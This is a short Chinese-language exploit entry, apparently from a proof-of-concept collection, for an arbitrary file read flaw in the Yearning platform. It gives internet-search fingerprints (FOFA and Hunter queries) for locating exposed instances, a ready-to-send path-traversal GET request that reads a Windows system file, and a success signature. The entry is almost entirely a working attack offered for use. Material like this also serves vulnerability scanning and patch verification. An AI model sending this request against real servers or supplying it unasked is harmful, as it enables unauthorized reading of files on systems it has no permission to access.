# Yearning-front-文件读取漏洞

Yearning ｜ 任意文件读取/写入 ｜ —
- **指纹**：`fofa: app="Yearning" hunter: app.name="Yearning"`
- **请求**：`GET /front/%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cc:%5Cwindows%5Cwin.ini HTTP/1.1`
- **响应特征**：200 support